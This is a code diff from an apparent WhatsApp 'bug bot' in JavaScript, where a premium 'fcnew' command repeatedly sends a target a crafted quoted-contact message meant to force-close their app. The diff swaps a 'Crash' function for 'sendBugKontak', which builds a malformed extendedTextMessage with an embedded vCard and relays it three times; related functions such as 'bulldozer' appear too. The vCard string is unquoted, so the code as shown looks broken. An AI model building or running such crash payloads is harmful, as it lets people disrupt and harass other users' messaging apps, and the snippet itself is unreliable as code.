@@ -1404,7 +1404,7 @@ bot.command("fcnew", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 3; i++) {
-    await BugForclose(target)
+    await sendBugKontak(target)
     
 }
 
@@ -2007,16 +2007,31 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
-async function Crash(target) {
-    for (let i = 0; i < 10; i++) {
-        await kipop.relayMessage(target, {
-            "extendedTextMessage":{
-"text":"X",
-"contextInfo":{
-"mentionedJid":[
-"5521992999999@s.whatsapp.net"
-],
-}
+async function sendBugKontak(target) {
+  const message = {
+    extendedTextMessage: {
+      text: "Memek",
+      contextInfo: {
+        stanzaId: "5521992999999@s.whatsapp.net",
+        participant: target,
+        quotedMessage: {
+          contactMessage: {
+            displayName: "@tamainfinity",
+            vcard: BEGIN:VCARD
+VERSION:3.0
+FN:@tamainfinity
+X-WA-BIZ-NAME:@tamainfinity
+
+ORG:@tamainfinity;
+TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
+END:VCARD
+          }
+        }
+      }
+    }
+  };
+
+  await kipop.relayMessage(target, message, {});
 }
 async function bulldozer(isTarget) {
   let message = {
